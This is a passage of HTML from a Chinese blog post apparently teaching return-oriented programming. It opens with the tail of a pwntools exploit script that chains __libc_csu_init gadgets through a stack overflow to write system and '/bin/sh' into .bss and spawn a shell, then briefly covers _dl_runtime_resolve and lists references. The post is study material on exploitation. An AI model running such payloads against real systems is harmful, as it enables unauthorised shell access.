发送第二段payload，写入binsh</span></span><br><span class="line">bss_addr = <span class="number">0x0000000000404038</span></span><br><span class="line">payload2 = <span class="string">&quot;A&quot;</span> * <span class="number">136</span> + p64(<span class="number">0x4011e2</span>) + p64(<span class="number">0</span>) + p64(<span class="number">1</span>) + p64(<span class="number">0</span>) + p64(bss_addr) + p64(<span class="number">16</span>) + p64(got_read) + p64(<span class="number">0x4011c8</span>)</span><br><span class="line"><span class="comment"># 填充栈，返回主函数</span></span><br><span class="line">payload2 += (<span class="string">&quot;A&quot;</span> * <span class="number">56</span> + p64(main_addr))</span><br><span class="line">p.send(payload2)</span><br><span class="line">p.send(p64(system_addr))</span><br><span class="line">p.send(<span class="string">&quot;/bin/sh\0&quot;</span>)</span><br><span class="line">p.recvuntil(<span class="string">&quot;\n&quot;</span>)</span><br><span class="line"><span class="comment"># 发送第三段payload，执行</span></span><br><span class="line">payload3 = <span class="string">&quot;A&quot;</span> * <span class="number">136</span> + p64(<span class="number">0x4011e2</span>) + p64(<span class="number">0</span>) + p64(<span class="number">1</span>) + p64(bss_addr+<span class="number">8</span>) + p64(<span class="number">0</span>) + p64(<span class="number">0</span>) + p64(bss_addr) + p64(<span class="number">0x4011c8</span>)</span><br><span class="line">p.send(payload3)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
+
+<h2 id="5-2-dl-runtime-resolve"><a href="#5-2-dl-runtime-resolve" class="headerlink" title="5.2. _dl_runtime_resolve"></a>5.2. _dl_runtime_resolve</h2><p>通过这个gadget可以控制六个64位参数寄存器的值，当我们使用参数比较多的函数的时候（比如mmap和mprotect）就可以派上用场了。</p>
+<h2 id="5-3-一个Tips"><a href="#5-3-一个Tips" class="headerlink" title="5.3. 一个Tips"></a>5.3. 一个Tips</h2><p>另外，通过控制PC跳转到某些经过稍微偏移过的地址（会改变程序原来的汇编代码）会得到意想不到的效果。</p>
+<h1 id="6-参考资料"><a href="#6-参考资料" class="headerlink" title="6. 参考资料"></a>6. 参考资料</h1><ul>
+<li>蒸米的《一步一步学ROP》系列文章</li>
+<li>《Linux PWN从入门到熟练》系列文章</li>
+</ul>
+</article><div class="post-copyright"><div class="post-copyright__author"><span class="post-copyright-meta"><i class="fas fa-circle-user fa-fw"></i>文章作者: </span><span class="post-copyright-info"><a href="https://yslingxu.github.io">凌虚</a></span></div><div class="post-copyright__type"><span class="post-copyright-meta"><i class="fas fa-square-arrow-up-right fa-fw"></i>文章链接: </span><span class="post-copyright-info"><a href="https://yslingxu.github.io/2026/04/28/%E6%BC%8F%E6%B4%9E%E6%8C%96%E6%8E%98/ROP/">https://yslingxu.github.io/2026/04/28/漏洞挖掘/ROP/</a></span></div><div class="post-copyright__notice"><span class="post-copyright-meta"><i class="fas fa-circle-exclamation fa-fw"></i>版权声明: </span><span class="post-copyright-info">本博客所有文章除特别声明外，均采用 <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/" rel="external nofollow noreferrer" target="_blank">CC BY-NC-SA 4.0</a> 许可协议。转载请注明来源 <a href="https://yslingxu.github.io" target="_blank">凌虚的博客</a>！</span></div></div><div class="tag_share"><div class="post-meta__tag-list"><a class="post-meta__tags" href="/tags/%E6%BC%8F%E6%B4%9E/">漏洞</a><a class="post-meta__tags" href="/tags/%E6%BC%8F%E6%B4%9E%E6%8C%96%E6%8E%98/">漏洞挖掘</a><a class="post-meta__tags" href="/tags/%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8/">漏洞利用</a><a class="post-meta__tags" href="/tags/ROP/">ROP</a></div><div class="post-share"><div class="social-share" data-image="/images/avatar.png" data-sites="facebook,x,wechat,weibo,qq"></div><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/butterfly-extsrc@1.1.6/sharejs/dist/css/share.min.css" media="print" onload="this.media='all'"><script src="https://cdn.jsdelivr.net/npm/butterfly-extsrc@1.1.6/sharejs/dist/js/social-share.min.js" defer></script></div></div><nav class="pagination-post" id="pagination"><a class="pagination-related" href="/2026/04/28/%E6%BC%8F%E6%B4%9E%E6%8C%96%E6%8E%98/%E5%86%85%E5%AD%98%E4%BF%9D%E6%8A%A4%E6%9C%BA%E5%88%B6%E4%B8%8E%E7%BB%95%E8%BF%87/" title="内存保护机制与绕过"><div class="cover" style="background: var(--default-bg-color)"></div><div class="info"><div class="info-1"><div class="info-item-1">上一篇</div><div class="info-item-2">内存保护机制与绕过</div></div><div class="info-2"><div class="info-item-1">1. 内存保护机制概述1.1. 漏洞起源冯诺依曼体系未对代码和数据作区分，现代漏洞大多基于这一点，导致用户数据被当作代码来执行。 1.2. 内存保护机制 GS编译技术，在函数返回地址之前加入了Security Cookie，函数返回前首先检测Security Cookie是否被覆盖，对抗栈溢出 SafeSEH，增加了对SEH的安全校验机制，对抗SEH覆盖 DEP（数据执行保护），将数据部分标示为不可执行，阻止栈、堆和数据节中攻击代码的执行 ASLR（加载地址随机），随机化可执行文件和动态链接库文件的加载地址，对抗溢出 SEHOP（SEH覆写保护），将SEH的保护提升到系统级别，对抗SEH溢出 在堆中加入了Heap Cookie、Safe Unlinking等一系列的安全机制，对抗堆溢出  1.3. 内存保护机制的对抗   目的 保护技术    覆盖返回地址 通过GS保护   覆盖SEH链 通过SafeSEH、SEHOP保护   覆盖本地变量 可能被VC编译器经过重新整理和优化   覆盖空闲堆双向链表 通过safe unlinking保护   覆盖堆块头 XP下使用8位的Heade...</div></div></div></a><a class="pagination-related" href="/2026/04/27/%E6%BC%8F%E6%B4%9E%E6%8C%96%E6%8E%98/%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8%E5%8E%9F%E7%90%86/" title="漏洞利用原理"><div class="cover" style="background: var(--default-bg-color)"></div><div class="info text-right"><div class="info-1"><div class="info-item-1">下一篇</div><div class="info-item-2">漏洞利用原理</div></div><div class="info-2"><div class="info-item-1">1. 基础知识以下知识均为逆向基础知识，此处做个记录，不再赘述。  漏洞概述 BUG与漏洞 漏洞挖掘 -&gt; 漏洞分析（POC） -&gt; 漏洞利用（EXP） 漏洞公布：CVE、CERT   二进制文件格式 PE格式 虚拟内存（4GB进程空间） PE格式与虚拟内存的映射   工具 OD、SoftICE（Compuware SoftICE Driver Suite 驱动套件）、WinDbg IDA Pro UE、010 Editor、Winhex VMWare Python   栈溢出 内存布局（代码、数据、栈、堆等） 函数调用与栈帧、函数调用约定 缓冲区溢出覆盖变量、EBP、返回地址（可以利用返回地址执行栈中植入的代码） 使用JMP ESP（使用kernel32或者user32里面的代码，地址一般情况下稳定）作为跳转，以防栈区地址变化    2. shellcode shellcode为功能代码（payload） exploit为攻击代码  2.1. 缓冲区的组织 缓冲区组成（shellcode、nop、跳转地址） 跳板 jmp esp（mov eax,esp ; jmp ...</div></div></div></a></nav><div class="relatedPosts"><div class="headline"><i class="fas fa-thumbs-up fa-fw"></i><span>相关推荐</span></div><div class="relatedPosts-list"><a class="pagination-related" href="/2026/04/28/%E6%BC%8F%E6%B4%9E%E6%8C%96%E6%8E%98/%E5%86%85%E5%AD%98%E4%BF%9D%E6%8A%A4%E6%9C%BA%E5%88%B6%E4%B8%8E%E7%BB%95%E8%BF%87/" title="内存保护机制与绕过"><div class="cover" style="background: var(--default-bg-color)"></div><div class="info text-center"><div class="info-1"><div class="info-item-1"><i class="far fa-calendar-alt fa-fw"></i> 2026-04-28</div><div class="info-item-2">内存保护机制与绕过</div></div><div class="info-2"><div class="info-item-1">1. 内存保护机制概述1.1. 漏洞起源冯诺依曼体系未对代码和数据作区分，现代漏洞大多基于这一点，导致用户数据被当作代码来执行。 1.2. 内存保护机制 GS编译技术，在函数返回地址之前加入了Security Cookie，函数返回前首先检测Security Cookie是否被覆盖，对抗栈溢出 SafeSEH，增加了对SEH的安全校验机制，对抗SEH覆盖 DEP（数据执行保护），将数据部分标示为不可执行，阻止栈、堆和数据节中攻击代码的执行 ASLR（加载地址随机），随机化可执行文件和动态链接库文件的加载地址，对抗溢出 SEHOP（SEH覆写保护），将SEH的保护提升到系统级别，对抗SEH溢出 在堆中加入了Heap Cookie、Safe Unlinking等一系列的安全机制，对抗堆溢出  1.3. 内存保护机制的对抗   目的 保护技术    覆盖返回地址 通过GS保护   覆盖SEH链 通过SafeSEH、SEHOP保护   覆盖本地变量 可能被VC编译器经过重新整理和优化   覆盖空闲堆双向链表 通过safe unlinking保护   覆盖堆块头 XP下使用8位的Heade...</div></div></div></a><a class="pagination-related" href="/2026/04/28/%E6%BC%8F%E6%B4%9E%E6%8C%96%E6%8E%98/%E6%BC%8F%E6%B4%9E%E6%8C%96%E6%8E%98%E6%96%B9%E6%B3%95/" title="漏洞挖掘方法"><div class="cover" style="background: var(--default-bg-color)"></div><div class="info text-center"><div class="info-1"><div class="info-item-1"><i class="far fa-calendar-alt fa-fw"></i> 2026-04-28</div><div class="info-item-2">漏洞挖掘方法</div></div><div class="info-2"><div class="info-item-1">1. 概述1.1. 图灵机停机问题程序存在不可计算性，因此理论上无法彻底消灭软件中存在的缺陷（Bug和漏洞）。 1.2. 白盒测试：源代码审计可利用以下工具进行源代码审计：  Fortify：在编译阶段扫描若干种安全风险 Rough Auditing Tool for Security：用于分析C&#x2F;C++语言的语法树，寻找存在潜在安全问题的函数调用 Bugs Errors And Mistakes：由IBM研究院研发，使用数据流分析的方法分析源代码的所有可执行路径，以检测代码中潜在的bug SLAM：检测驱动中的bug Flaw Finder：用Python语言开发的代码分析工具 Prexis：可以审计多种语言的源代码，审计的漏洞类型超过30种 Coverity：提高软件质量的源代码静态分析工具  1.3. 黑盒测试：FuzzFuzz使用带有攻击性的畸形数据来触发各种类型的漏洞（不能exploit），可使用以下工具：  SPIKE：针对网络协议的模糊测试工具，使用了基于数据块的Fuzz理论 beSTORM：利用了模糊测试技术来实现针对网络协议的安全测试  2. 文件类型...</div></div></div></a><a class="pagination-related" href="/2026/04/27/%E6%BC%8F%E6%B4%9E%E6%8C%96%E6%8E%98/%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8%E5%8E%9F%E7%90%86/" title="漏洞利用原理"><div class="cover" style="background: var(--default-bg-color)"></div><div class="info text-center"><div class="info-1"><div class="info-item-1"><i class="far fa-calendar-alt fa-fw"></i> 2026-04-27</div><div class="info-item-2">漏洞利用原理</div></div><div class="info-2"><div class="info-item-1">1. 基础知识以下知识均为逆向基础知识，此处做个记录，不再赘述。  漏洞概述 BUG与漏洞 漏洞挖掘 -&gt; 漏洞分析（POC） -&gt; 漏洞利用（EXP） 漏洞公布：CVE、CERT   二进制文件格式 PE格式 虚拟内存（4GB进程空间） PE格式与虚拟内存的映射   工具 OD、SoftICE（Compuware SoftICE Driver Suite 驱动套件）、WinDbg IDA Pro UE、010 Editor、Winhex VMWare Python   栈溢出 内存布局（代码、数据、栈、堆等） 函数调用与栈帧、函数调用约定 缓冲区溢出覆盖变量、EBP、返回地址（可以利用返回地址执行栈中植入的代码） 使用JMP ESP（使用kernel32或者user32里面的代码，地址一般情况下稳定）作为跳转，以防栈区地址变化    2. shellcode shellcode为功能代码（payload） exploit为攻击代码  2.1. 缓冲区的组织 缓冲区组成（shellcode、nop、跳转地址） 跳板 jmp esp（mov eax,esp ; jmp ...</div></div></div></a></div></div></div><div class="aside-content" id="aside-content"><div class="card-widget card-info text-center"><div class="avatar-img"><img src="/images/avatar.png" onerror="this.onerror=null;this.src='/img/friend_404.gif'" alt="avatar"/></div><div class="author-info-name">凌虚</div><div class="author-info-description">空谷临风，逸世凌虚</div><div class="site-data"><a href="/archives/"><div class="headline">文章</div><div class="length-num">29</div></a><a href="/tags/"><div class="headline">标签</div><div class="length-num">26</div></a><a href="/categories/"><div class="headline">分类</div><div class="length-num">7</div></a></div><a id="card-info-btn" target="_blank" rel="noopener external nofollow noreferrer" href="https://github.com/yslingxu"><i class="fab fa-github"></i><span>Follow Me</span></a><div class="card-info-social-icons"><a class="social-icon" href="https://github.com/yslingxu" rel="external nofollow noreferrer" target="_blank" title="Github"><i class="fab fa-github" style="color: #24292e;"></i></a><a class="social-icon" href="mailto:yslingxu@outlook.com" rel="external nofollow noreferrer" target="_blank" title="Email"><i class="fas fa-envelope" style="color: #4a7dbe;"></i></a></div></div><div class="card-widget card-announcement"><div class="item-headline"><i class="fas fa-bullhorn fa-shake"></i><span>公告</span></div><div class="announcement_content">给大家拜个早年！新年快乐！</div></div><div class="sticky_layout"><div class="card-widget" id="card-toc"><div class="item-headline"><i class="fas fa-stream"></i><span>目录</span><span class="toc-percentage"></span></div><div class="toc-content is-expand"><ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#1-%E6%A6%82%E8%BF%B0"><span class="toc-text">1. 概述</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#1-1-%E7%A8%8B%E5%BA%8F%E6%B5%81%E5%8A%AB%E6%8C%81%EF%BC%88Control-Flow-Hijack%EF%BC%89"><span class="toc-text">1.1. 程序流劫持（Control Flow Hijack）</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#1-2-%E7%B3%BB%E7%BB%9F%E9%98%B2%E5%BE%A1"><span class="toc-text">1.2. 系统防御</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#1-3-ROP%E7%9A%84%E6%A6%82%E5%BF%B5"><span class="toc-text">1.3. ROP的概念</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#2-%E5%87%86%E5%A4%87%E5%B7%A5%E4%BD%9C"><span class="toc-text">2. 准备工作</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#2-1-%E8%AE%BE%E7%BD%AEcoredump"><span class="toc-text">2.1. 设置coredump</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#2-2-%E8%A7%A3%E9%99%A4%E5%AE%89%E5%85%A8%E6%8E%AA%E6%96%BD%E7%9A%84%E6%96%B9%E6%B3%95"><span class="toc-text">2.2. 解除安全措施的方法</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#2-3-%E5%B0%86%E7%A8%8B%E5%BA%8F%E7%BB%91%E5%AE%9A%E5%88%B0%E7%AB%AF%E5%8F%A3%EF%BC%9ASOCAT"><span class="toc-text">2.3. 将程序绑定到端口：SOCAT</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#2-4-32%E4%BD%8D%E5%BA%93"><span class="toc-text">2.4. 32位库</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#2-5-shellcode"><span class="toc-text">2.5. shellcode</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#2-5-1-32%E4%BD%8D"><span class="toc-text">2.5.1. 32位</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#2-5-1-1-21%E5%AD%97%E8%8A%82%E7%B3%BB%E7%BB%9F%E8%B0%83%E7%94%A8"><span class="toc-text">2.5.1.1. 21字节系统调用</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#2-5-2-64%E4%BD%8D"><span class="toc-text">2.5.2. 64位</span></a></li></ol></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#3-%E5%B7%A5%E5%85%B7"><span class="toc-text">3. 工具</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#3-1-gadgets%E5%B7%A5%E5%85%B7"><span class="toc-text">3.1. gadgets工具</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#3-1-1-ROPgadget"><span class="toc-text">3.1.1. ROPgadget</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#3-2-pwntools"><span class="toc-text">3.2. pwntools</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#3-3-EDB"><span class="toc-text">3.3. EDB</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#3-4-objdump"><span class="toc-text">3.4. objdump</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#3-5-GDB"><span class="toc-text">3.5. GDB</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#3-6-%E5%85%B6%E5%AE%83"><span class="toc-text">3.6. 其它</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#4-%E6%80%9D%E8%B7%AF%E6%80%BB%E7%BB%93"><span class="toc-text">4. 思路总结</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#4-1-%E5%88%A9%E7%94%A8%E6%AD%A5%E9%AA%A4"><span class="toc-text">4.1. 利用步骤</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#4-2-%E6%96%B9%E6%A1%88%E8%A1%A8"><span class="toc-text">4.2. 方案表</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#4-3-x64%E4%BD%8D%E7%9A%84%E6%B3%A8%E6%84%8F%E4%BA%8B%E9%A1%B9"><span class="toc-text">4.3. x64位的注意事项</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#5-%E9%80%9A%E7%94%A8gadgets"><span class="toc-text">5. 通用gadgets</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#5-1-libc-csu-init"><span class="toc-text">5.1. __libc_csu_init</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#5-2-dl-runtime-resolve"><span class="toc-text">5.2. _dl_runtime_resolve</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#5-3-%E4%B8%80%E4%B8%AATips"><span class="toc-text">5.3. 一个Tips</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#6-%E5%8F%82%E8%80%83%E8%B5%84%E6%96%99"><span class="toc-text">6. 参考资料</span></a></li></ol></div></div><div class="card-widget card-recent-post"><div class="item-headline"><i class="fas fa-history"></i><span>最新文章</span></div><div class="aside-list"><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/2026/04/28/%E6%BC%8F%E6%B4%9E%E6%8C%96%E6%8E%98/%E6%BC%8F%E6%B4%9E%E6%8C%96%E6%8E%98%E6%96%B9%E6%B3%95/" title="漏洞挖掘方法">漏洞挖掘方法</a><time datetime="2026-04-28T03:33:10.000Z" title="发表于 2026-04-28 11:33:10">2026-04-28</time></div></div><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/2026/04/28/%E6%BC%8F%E6%B4%9E%E6%8C%96%E6%8E%98/%E5%86%85%E5%AD%98%E4%BF%9D%E6%8A%A4%E6%9C%BA%E5%88%B6%E4%B8%8E%E7%BB%95%E8%BF%87/" title="内存保护机制与绕过">内存保护机制与绕过</a><time datetime="2026-04-28T02:33:10.000Z" title="发表于 2026-04-28 10:33:10">2026-04-28</time></div></div><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/2026/04/28/%E6%BC%8F%E6%B4%9E%E6%8C%96%E6%8E%98/ROP/" title="ROP">ROP</a><time datetime="2026-04-28T01:33:10.000Z" title="发表于 2026-04-28 09:33:10">2026-04-28</time></div></div><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/2026/04/27/%E6%BC%8F%E6%B4%9E%E6%8C%96%E6%8E%98/%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8%E5%8E%9F%E7%90%86/" title="漏洞利用原理">漏洞利用原理</a><time datetime="2026-04-27T14:33:10.000Z" title="发表于 2026-04-27 22:33:10">2026-04-27</time></div></div><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/2026/04/27/%E4%BC%9A%E8%AE%A1%E5%AD%A6/%E4%BC%9A%E8%AE%A1%E5%AD%A6%E5%9F%BA%E7%A1%80/" title="会计学基础">会计学基础</a><time datetime="2026-04-27T11:33:10.000Z" title="发表于 2026-04-27 19:33:10">2026-04-27</time></div></div></div></div></div></div></main><footer id="footer"><div class="footer-other"><div class="footer-copyright"><span class="copyright">&copy;&nbsp;2025 - 2026 By 凌虚</span><span class="framework-info"><span>框架 </span><a target="_blank" rel="noopener external nofollow noreferrer" href="https://hexo.io">Hexo 7.3.0</a><span class="footer-separator">|</span><span>主题 </span><a target="_blank" rel="noopener external nofollow noreferrer" href="https://github.com/jerryc127/hexo-theme-butterfly">Butterfly 5.5.4</a></span></div></div></footer></div><div id="rightside"><div id="rightside-config-hide"><button id="readmode" type="button" title="阅读模式"><i class="fas fa-book-open"></i></button><button id="darkmode" type="button" title="日间和夜间模式切换"><i class="fas fa-adjust"></i></button><button id="hide-aside-btn" type="button" title="单栏和双栏切换"><i class="fas fa-arrows-alt-h"></i></button></div><div id="rightside-config-show"><button id="rightside-config" type="button" title="设置"><i class="fas fa-cog fa-spin"></i></button><button class="close" id="mobile-toc-button" type="button" title="目录"><i class="fas fa-list-ul"></i></button><button id="go-up" type="button" title="回到顶部"><span class="scroll-percent"></span><i class="fas fa-arrow-up"></i></button></div></div><div><script src="/js/utils.js?v=5.5.4"></script><script src="/js/main.js?v=5.5.4"></script><div class="js-pjax"></div><script async data-pjax src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script></div></body></html>
